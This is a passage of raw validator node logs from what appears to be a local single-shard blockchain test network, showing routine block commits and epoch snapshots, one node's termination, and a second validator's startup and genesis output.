[0;32mINFO [0m[2026-10-06 22:08:39.018] [process/block]      [0/2/67/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 67 [0;32mnonce[0m = 64 [0;32mhash[0m = a4ab9a89a9ecd6c5ca3a95d458f27aedf481a75e7317e65d269081be621ba6d8 
[0;32mINFO [0m[2026-10-06 22:08:45.020] [process/block]      [0/2/68/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 68 [0;32mnonce[0m = 65 [0;32mhash[0m = 83cc45fe52ff0e0de000064eb406bf8af0291a3a1c96ea10eaed31d3fce15e89 
[0;32mINFO [0m[2026-10-06 22:08:51.016] [process/block]      [0/2/69/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 69 [0;32mnonce[0m = 66 [0;32mhash[0m = f7cd5d533d860982fd22ad45a10a44aaaaa8c3d318630338217975fc0f107f54 
[0;32mINFO [0m[2026-10-06 22:08:57.017] [process/block]      [0/2/70/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 70 [0;32mnonce[0m = 67 [0;32mhash[0m = 0d49f5ea35b970b6af2479b7f617ac6ba705d0348bbfb5444c60618ed6031b24 
[0;32mINFO [0m[2026-10-06 22:09:03.016] [process/block]      [0/2/71/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 71 [0;32mnonce[0m = 68 [0;32mhash[0m = cab0dddfc0c54296efd10e3a6c768cf65e05a014bc7450a70427319a866926ae 
[0;32mINFO [0m[2026-10-06 22:09:09.021] [process/block]      [0/2/72/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 72 [0;32mnonce[0m = 69 [0;32mhash[0m = 0429c42bc61394cd44582550a68a72aaf0044e68de9923f8a11805294f983902 
[0;32mINFO [0m[2026-10-06 22:09:15.027] [process/block]      [0/2/73/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 73 [0;32mnonce[0m = 70 [0;32mhash[0m = 56aa8b0eeabdcd5e07003e9e20f023f8a2153d47d2cc8081468675415d717117 
[0;32mINFO [0m[2026-10-06 22:09:24.022] [process/block]      [0/3/74/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 74 [0;32mnonce[0m = 71 [0;32mhash[0m = acc0c67794d94f46df340547791ce1e9da2a46a07c24399227474395832153a2 
[0;33mWARN [0m[2026-10-06 22:09:24.026] [..nsus/spos/bls/v2] [0/3/74/(END_ROUND)] doEndRoundJobByNode.CommitBlock          [0;33melapsed time[0m = 3.004238708s 
[0;32mINFO [0m[2026-10-06 22:09:27.007] [processProxy]       [0/3/75/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:09:27.007] [processProxy]       [0/3/75/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:09:29.079] [process/block]      [0/3/75/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 75 [0;32mnonce[0m = 72 [0;32mhash[0m = e2f6bf4c84964ab371ac13f754590222a029382e7c4583ce2b1f12d358af2244 
[0;32mINFO [0m[2026-10-06 22:09:29.083] [state]              [0/3/75/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 2c473afb8c885d35d627983af2acb0bae6723a2099552c9bc2fb362441561d56 [0;32mepoch[0m = 3 
[0;32mINFO [0m[2026-10-06 22:09:33.021] [process/block]      [0/3/76/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 76 [0;32mnonce[0m = 73 [0;32mhash[0m = 03320edef061391af970a7278631dba85bcb8cdc1976a6d6610b7d77a0e85b0a 
[0;32mINFO [0m[2026-10-06 22:09:39.015] [process/block]      [0/3/77/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 77 [0;32mnonce[0m = 74 [0;32mhash[0m = a9b39869efb6b21d31131ffdf6b10983f3a8a1942fd299473a751ae9c1e8b32b 
[0;32mINFO [0m[2026-10-06 22:09:45.015] [process/block]      [0/3/78/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 78 [0;32mnonce[0m = 75 [0;32mhash[0m = c2df6b76de1588b28b1ec06cfa05c81c3933058b1c97ad9e5652b0dc9bf5ede8 
[0;32mINFO [0m[2026-10-06 22:09:51.026] [process/block]      [0/3/79/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 79 [0;32mnonce[0m = 76 [0;32mhash[0m = 4b0b3a4c9e3a679c8f38420cdf1645ad0da6df5c3be5cfe3d5b531df68908c33 
[0;32mINFO [0m[2026-10-06 22:09:57.019] [process/block]      [0/3/80/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 80 [0;32mnonce[0m = 77 [0;32mhash[0m = c125089cf86db66258ceaeeaaf307831269e6f927984381ba1327d1d2ebd9db7 
[0;32mINFO [0m[2026-10-06 22:10:03.022] [process/block]      [0/3/81/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 81 [0;32mnonce[0m = 78 [0;32mhash[0m = 00a057f4b042c2bef140bfab788d454b12becb77c2f1c00916503d55a857316c 
[0;32mINFO [0m[2026-10-06 22:10:09.019] [process/block]      [0/3/82/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 82 [0;32mnonce[0m = 79 [0;32mhash[0m = 9809702a1e77c948885306d007bc4f808c900a4485f91164c1bffcc92244a18d 
[0;32mINFO [0m[2026-10-06 22:10:15.018] [process/block]      [0/3/83/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 83 [0;32mnonce[0m = 80 [0;32mhash[0m = 8281c2d4b85db434674eddcd06b23edd60f1d8719a1c4e3173a8ece11833494d 
[0;32mINFO [0m[2026-10-06 22:10:21.019] [process/block]      [0/3/84/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 84 [0;32mnonce[0m = 81 [0;32mhash[0m = 7617a76e3ed0a08125d4cc31372fc9faf667ee8781f754882cbc9554c2dc594b 
[0;32mINFO [0m[2026-10-06 22:10:27.022] [process/block]      [0/3/85/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 85 [0;32mnonce[0m = 82 [0;32mhash[0m = 38d25a0e5f43aaf12bf9ccce1fbca5866d05f0942613b579c505dee50bee70f2 
[0;32mINFO [0m[2026-10-06 22:10:33.019] [process/block]      [0/3/86/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 86 [0;32mnonce[0m = 83 [0;32mhash[0m = 6711add0d388374d90aa72cde191e7a85bec19e461635eaf5eb41cb633836db8 
[0;32mINFO [0m[2026-10-06 22:10:39.014] [process/block]      [0/3/87/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 87 [0;32mnonce[0m = 84 [0;32mhash[0m = 7c648ce0ac4bee03dd10c8ed577ecc38fd54b683bf2470b71bf1ca688ae0c7c3 
[0;32mINFO [0m[2026-10-06 22:10:45.018] [process/block]      [0/3/88/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 88 [0;32mnonce[0m = 85 [0;32mhash[0m = 568996efae6f5dd82897a99442f959c7b3524380ac4058c1623ddf9c33cc9d74 
[0;32mINFO [0m[2026-10-06 22:10:51.028] [process/block]      [0/3/89/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 89 [0;32mnonce[0m = 86 [0;32mhash[0m = 8e3efc51d7340a15b9ec97a76e08d2cd8f796df882eb52d49dd2da651b976d93 
[0;32mINFO [0m[2026-10-06 22:10:57.022] [process/block]      [0/3/90/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 90 [0;32mnonce[0m = 87 [0;32mhash[0m = 777f9e331e8bc89ce35caef9ad66833f1c45c85fc833f9ee806e162d9fcbecc8 
[0;32mINFO [0m[2026-10-06 22:11:03.034] [process/block]      [0/3/91/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 91 [0;32mnonce[0m = 88 [0;32mhash[0m = 55cfa49c37fb227c9d6d2a11a7b5f576b3567a577abf1f87866453c10e0cd4b1 
[0;32mINFO [0m[2026-10-06 22:11:09.018] [process/block]      [0/3/92/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 92 [0;32mnonce[0m = 89 [0;32mhash[0m = d840d06c69b5bed70d30771423630c1a2f6c8bfb6f71cac0ec8334647eca1887 
[0;32mINFO [0m[2026-10-06 22:11:15.013] [process/block]      [0/3/93/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 93 [0;32mnonce[0m = 90 [0;32mhash[0m = 01e3691290f4845b1f61e94502fa26842d9524b8563a2b0c2ed2f7225db347eb 
[0;32mINFO [0m[2026-10-06 22:11:21.018] [process/block]      [0/3/94/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 94 [0;32mnonce[0m = 91 [0;32mhash[0m = 982c58e60487a5cfc307f5073005d5fe9859098e729e554e156519ed0382fad8 
[0;32mINFO [0m[2026-10-06 22:11:27.020] [process/block]      [0/3/95/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 95 [0;32mnonce[0m = 92 [0;32mhash[0m = 4bdf0dc4537cc235241a4eba59a1fb1d2610acaa127e06d86b158056fe17ca2e 
[0;32mINFO [0m[2026-10-06 22:11:33.019] [process/block]      [0/3/96/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 96 [0;32mnonce[0m = 93 [0;32mhash[0m = 3786d833a40cceaf8762d7efc194aaad48dbc2612ae4c15e7a23354b61597a3a 
[0;32mINFO [0m[2026-10-06 22:11:39.019] [process/block]      [0/3/97/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 97 [0;32mnonce[0m = 94 [0;32mhash[0m = 46f68051c07ec10a415e34657bbfee9193168c75e248dd61c0995a43352b4cff 
[0;32mINFO [0m[2026-10-06 22:11:45.017] [processProxy]       [0/4/98/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:11:45.017] [processProxy]       [0/4/98/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:11:47.014] [process/block]      [0/4/98/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 98 [0;32mnonce[0m = 95 [0;32mhash[0m = 2e4ac356ca9669c64a52912eda71d8e7de3da77ae2a806a29b20744ff4631c20 
[0;32mINFO [0m[2026-10-06 22:11:47.018] [state]              [0/4/98/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 7abb6257950623b825e9971cfa6cf0373ea5b58fa0d712636b22661505fb7d59 [0;32mepoch[0m = 4 
[0;32mINFO [0m[2026-10-06 22:11:51.024] [process/block]      [0/4/99/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 99 [0;32mnonce[0m = 96 [0;32mhash[0m = 57fbb32eb6f3a9eb5f5623c6b9748eefaebbe036ad07a33c58b22a22a55b144e 
[0;32mINFO [0m[2026-10-06 22:11:57.024] [process/block]      [0/4/100/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 100 [0;32mnonce[0m = 97 [0;32mhash[0m = 8cbcc4cdcb225e5eec1840e30f0006e362e6a30e3eb57bf59ca65bee72c6437a 
[0;32mINFO [0m[2026-10-06 22:12:03.016] [process/block]      [0/4/101/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 101 [0;32mnonce[0m = 98 [0;32mhash[0m = 450e8f4588f2565befa1001767997f32d2f11dd9ce2369e0ff9f22be85003ea5 
[0;32mINFO [0m[2026-10-06 22:12:09.028] [process/block]      [0/4/102/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 102 [0;32mnonce[0m = 99 [0;32mhash[0m = 57b9b6c0a2a6739b3a5c157a947a8cb02691dbd1822ff4e631dcfd39259ef7d1 
[0;32mINFO [0m[2026-10-06 22:12:15.020] [process/block]      [0/4/103/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 103 [0;32mnonce[0m = 100 [0;32mhash[0m = 511179cba9362c163d7feeca9d028c1a4dd6cc45a2515d05989ca0c95671b519 
[0;32mINFO [0m[2026-10-06 22:12:21.026] [process/block]      [0/4/104/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 104 [0;32mnonce[0m = 101 [0;32mhash[0m = 8aa9fea6c45c0ed64ef2c08e8c653c10830f1b1265ca19d8d2766757de7d8e56 
[0;32mINFO [0m[2026-10-06 22:12:27.016] [process/block]      [0/4/105/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 105 [0;32mnonce[0m = 102 [0;32mhash[0m = eaeb13980d6f07abc88a4b4ca4e87df847d29786ed8ee39b1c9720fbf5080b0a 
[0;32mINFO [0m[2026-10-06 22:12:33.021] [process/block]      [0/4/106/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 106 [0;32mnonce[0m = 103 [0;32mhash[0m = 4c5c2cc0f2b18af6ac405c90959097fa478eed25df39874449d4f6ba8cefee70 
[0;32mINFO [0m[2026-10-06 22:12:39.017] [process/block]      [0/4/107/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 107 [0;32mnonce[0m = 104 [0;32mhash[0m = 056af6eaff801fc3a8059f78b8cfd871acc5d4c54dccabb1ae9bfddec4c52a47 
[0;32mINFO [0m[2026-10-06 22:12:45.017] [process/block]      [0/4/108/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 108 [0;32mnonce[0m = 105 [0;32mhash[0m = d6e139f47f3abc2702da50d0529c9e63cbebc9a01758d58d70fc40b3b844153e 
[0;32mINFO [0m[2026-10-06 22:12:51.022] [process/block]      [0/4/109/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 109 [0;32mnonce[0m = 106 [0;32mhash[0m = 823c47fc41a85d6529bbb4178d94a47d28d5955efbc87fc730583bb6d8b80e42 
[0;32mINFO [0m[2026-10-06 22:12:57.015] [process/block]      [0/4/110/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 110 [0;32mnonce[0m = 107 [0;32mhash[0m = 8933812d04ebf44ae0d2a367683c712ec62d998f1ccec32096287b2835009f78 
[0;32mINFO [0m[2026-10-06 22:13:03.022] [process/block]      [0/4/111/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 111 [0;32mnonce[0m = 108 [0;32mhash[0m = 43c2456e4d2d62be12454a14b96b4b13bbe0e74994d3fe6d14260b15d9fb0641 
[0;32mINFO [0m[2026-10-06 22:13:09.023] [process/block]      [0/4/112/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 112 [0;32mnonce[0m = 109 [0;32mhash[0m = f345e83e89725fbe2d64efa0f7be92e459896dd0b5e3c994f03694779deba00e 
[0;32mINFO [0m[2026-10-06 22:13:15.018] [process/block]      [0/4/113/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 113 [0;32mnonce[0m = 110 [0;32mhash[0m = 4f943afc72543df1df88e8bab5789f34907812e92ee4472dec8588cf57f953f1 
[0;32mINFO [0m[2026-10-06 22:13:21.020] [process/block]      [0/4/114/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 114 [0;32mnonce[0m = 111 [0;32mhash[0m = 09c7f0261d7f8888c63634481d907138843629c129700342f8d5c007293a607f 
[0;32mINFO [0m[2026-10-06 22:13:27.022] [process/block]      [0/4/115/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 115 [0;32mnonce[0m = 112 [0;32mhash[0m = daf1c778ffcca84911d0a0b010bef5ace505641e875d30a2fc03df342c6275cd 
[0;32mINFO [0m[2026-10-06 22:13:33.016] [process/block]      [0/4/116/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 116 [0;32mnonce[0m = 113 [0;32mhash[0m = 2552105ebc45c5ed645d436330de9bde9ac1917698bd72650e6b1ab645f43b58 
[0;32mINFO [0m[2026-10-06 22:13:39.020] [process/block]      [0/4/117/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 117 [0;32mnonce[0m = 114 [0;32mhash[0m = 2af755a6438542af6047e6e12ed3b202ec3cf6842ccad316fe66025bd8a4a40e 
[0;32mINFO [0m[2026-10-06 22:13:45.019] [process/block]      [0/4/118/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 118 [0;32mnonce[0m = 115 [0;32mhash[0m = 4c9163ea7c209b0ec402ce8882c60167e2cfb1342ee67773c62f997a711389a8 
[0;32mINFO [0m[2026-10-06 22:13:51.025] [process/block]      [0/4/119/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 119 [0;32mnonce[0m = 116 [0;32mhash[0m = 9c710ec3423c79d14e555f015ef7a46a8eaacaecdc87f18c4b01db0ea581be3e 
[0;32mINFO [0m[2026-10-06 22:13:57.023] [process/block]      [0/4/120/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 120 [0;32mnonce[0m = 117 [0;32mhash[0m = 135025b050731fbf52a29c6713fa9857c34130f09e62875416028d495e16691b 
[0;32mINFO [0m[2026-10-06 22:14:03.010] [processProxy]       [0/5/121/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:14:03.010] [processProxy]       [0/5/121/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:14:05.190] [process/block]      [0/5/121/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 121 [0;32mnonce[0m = 118 [0;32mhash[0m = ece8dc1f956fb9db80e03d8c821472451f09036203daa9d325fe10db91a9b1a1 
[0;32mINFO [0m[2026-10-06 22:14:05.194] [state]              [0/5/121/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = f50cefa3cc02078d8a54b3274d0a93b3ec3b3ab6a7dcf5ae6c7b2637b315514f [0;32mepoch[0m = 5 
[0;32mINFO [0m[2026-10-06 22:14:09.022] [process/block]      [0/5/122/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 122 [0;32mnonce[0m = 119 [0;32mhash[0m = ad1152637f6c272af3a4ac7f8ba8ebfd9b23e9515c33093ab020f40e46800d16 
[0;32mINFO [0m[2026-10-06 22:14:15.022] [process/block]      [0/5/123/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 123 [0;32mnonce[0m = 120 [0;32mhash[0m = 7acf78ea4b645517c4b7951b2a7e1f37492ee9926ed4d626cda21274a70ae186 
[0;32mINFO [0m[2026-10-06 22:14:21.021] [process/block]      [0/5/124/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 124 [0;32mnonce[0m = 121 [0;32mhash[0m = bc9aa6f3c352f6d061e137ee0dd3f4d910417c3c76322114a3ebeb08d613fa5a 
[0;32mINFO [0m[2026-10-06 22:14:27.019] [process/block]      [0/5/125/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 125 [0;32mnonce[0m = 122 [0;32mhash[0m = 8e73a4e45df464fa7056e956d9270973ed1518a96d9f40ad5e134483902bd834 
[0;32mINFO [0m[2026-10-06 22:14:33.021] [process/block]      [0/5/126/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 126 [0;32mnonce[0m = 123 [0;32mhash[0m = e5290014b14df591eb3c2709822eee2b0347a463003ad3efd057d019393de1ca 
[0;32mINFO [0m[2026-10-06 22:14:34.068] [node]               [0/5/126/(END_ROUND)] terminating at user's signal...          
```

### C 5.4, validator4 full log, shard process started 22:01:39, 123 blocks committed, terminated 22:14:33

File `security-research/node-logs/validator4.log`.

```text
[0;32mINFO [0m[2026-10-06 22:01:39.372] [node]               [/0/0/]        starting node                            [0;32mversion[0m = v1.0.0/go1.26.4/darwin-arm64/3bd876d357 [0;32mpid[0m = 43293 
[0;32mINFO [0m[2026-10-06 22:01:39.373] [factory]            [/0/0/]        start time                               [0;32mformatted[0m = Tue Oct 6 22:01:57 WAT 2026 [0;32munix timestamp[0m = 1791320517 [0;32msupernova unix timestamp[0m = 1791323157 [0;32mround duration[0m = 6s [0;32msupernova round duration[0m = 6s 
[0;32mINFO [0m[2026-10-06 22:01:39.380] [factory]            [/0/0/]        the node loaded the validatorKey.pem file and is running in single-key mode 
[0;32mINFO [0m[2026-10-06 22:01:39.399] [factory]            [/0/0/]        p2p private key: generated a new private key for p2p signing 
[0;32mINFO [0m[2026-10-06 22:01:39.407] [main/p2p]           [/0/0/]        listening on addresses                   [0;32maddr0[0m = /ip4/127.0.0.1/tcp/21504/p2p/16Uiu2HAmDYhB5vgPkpChAzVhGUzCY6Av13UcShQegAESzS2Ffvtr [0;32maddr1[0m = /ip4/172.20.10.5/tcp/21504/p2p/16Uiu2HAmDYhB5vgPkpChAzVhGUzCY6Av13UcShQegAESzS2Ffvtr 
[0;32mINFO [0m[2026-10-06 22:01:39.408] [main/p2p]           [/0/0/]        started the network discovery process... 
[0;32mINFO [0m[2026-10-06 22:01:59.411] [factory]            [/0/0/]        shard info                               [0;32mstarted in shard[0m = 0 
[0;32mINFO [0m[2026-10-06 22:01:59.413] [factory]            [/0/0/]        bootstrap parameters                     [0;32mshardId[0m = 0 [0;32mepoch[0m = 0 [0;32mnumShards[0m = 1 
[0;32mINFO [0m[2026-10-06 22:01:59.413] [node]               [/0/0/]        Bootstrap                                [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:06.452] [..nodesCoordinator] [0/0/0/]       new nodes config is set for epoch        [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:06.474] [vmContainerFactory] [0/0/0/]       VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:06.481] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.725] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.728] [genesis/process]    [0/0/0/]       genesisBlockCreator.createHeaders        [0;32mshard[0m = 0 [0;32mnonce[0m = 0 [0;32mround[0m = 0 [0;32mroot hash[0m = 79c9a65d56dd423b42fde0405f173fbaf42d081e4de05780814e509da6664770 
[0;32mINFO [0m[2026-10-06 22:02:09.731] [genesis/process]    [0/0/0/]       genesisBlockCreator.createHeaders        [0;32mshard[0m = 4294967295 [0;32mnonce[0m = 0 [0;32mround[0m = 0 [0;32mroot hash[0m = 5b8c8589b3a99e69f13a0e556ed873b94e6236d4756c19ebd16de6e62792ff8d 
[0;32mINFO [0m[2026-10-06 22:02:09.899] [vmContainerFactory] [0/0/0/]       VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:10.008] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:10.013] [factory]            [0/0/0/]       AOT transaction selection enabled        [0;32mcacheSize[0m = 10 [0;32mselectionTimeoutMs[0m = 30000 
[0;32mINFO [0m[2026-10-06 22:02:10.038] [factory]            [0/0/0/]       indexGenesisBlocks(): historyRepo.RecordBlock [0;32mshardID[0m = 0 [0;32mhash[0m = 44c8ad7cae76622aec11467c2c08d55e08eb2168dc1f67baf8108e349e41732d 
[0;32mINFO [0m[2026-10-06 22:02:10.386] [vmContainerFactory] [0/0/0/]       VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:10.500] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;33mWARN [0m[2026-10-06 22:02:10.503] [state]              [0/0/0/]       could not retrieve snapshot info         [0;33merror[0m = key not found 
[0;32mINFO [0m[2026-10-06 22:02:10.503] [factory]            [0/0/0/]       starting consensus                       [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:10.509] [vmContainerFactory] [0/0/2/(START_ROUND)] VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:10.523] [node]               [0/0/2/(BLOCK)] application is now running               
[0;32mINFO [0m[2026-10-06 22:02:10.953] [processProxy]       [0/0/2/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:11.033] [processProxy]       [0/0/2/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:11.043] [process/block]      [0/0/2/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 2 [0;32mnonce[0m = 1 [0;32mhash[0m = d5bdd96278b9dbd0f5207b2b83bc0f27043f074c125dc9070489f05efd7348aa 
[0;32mINFO [0m[2026-10-06 22:02:15.015] [process/block]      [0/0/3/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 3 [0;32mnonce[0m = 2 [0;32mhash[0m = 36586d5593d9fbb8f43f889cc78200efed240d8f77671bdb1deea97a72d82e04 
[0;32mINFO [0m[2026-10-06 22:02:21.013] [process/block]      [0/0/4/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 4 [0;32mnonce[0m = 3 [0;32mhash[0m = f7ab2e1fc0e18335e948b13fb3468942c4b09c2d6092eff80e8bd8b179528d67 
[0;32mINFO [0m[2026-10-06 22:02:27.016] [process/block]      [0/0/5/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 5 [0;32mnonce[0m = 4 [0;32mhash[0m = d3545a9a67a0580e3e8f9479a2a8f191a7bdaacddab847f05bedd76065626d3a 
[0;32mINFO [0m[2026-10-06 22:02:33.013] [process/block]      [0/0/6/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 6 [0;32mnonce[0m = 5 [0;32mhash[0m = 9d470069c6137fe2d43a3d458807089baeee6639c070592bff6255b1b46c7070 
[0;32mINFO [0m[2026-10-06 22:02:39.016] [process/block]      [0/0/7/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 7 [0;32mnonce[0m = 6 [0;32mhash[0m = 8022e0edb3f7b3a39cb074302123db3a9817edaa8d99bc51fb9f7e637143e54c 
[0;32mINFO [0m[2026-10-06 22:02:45.013] [process/block]      [0/0/8/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 8 [0;32mnonce[0m = 7 [0;32mhash[0m = 8458e3fdc458619cb5ab4abf4388ee5fbe81d6ec0479c9a4f69b2e5748bd16c1 
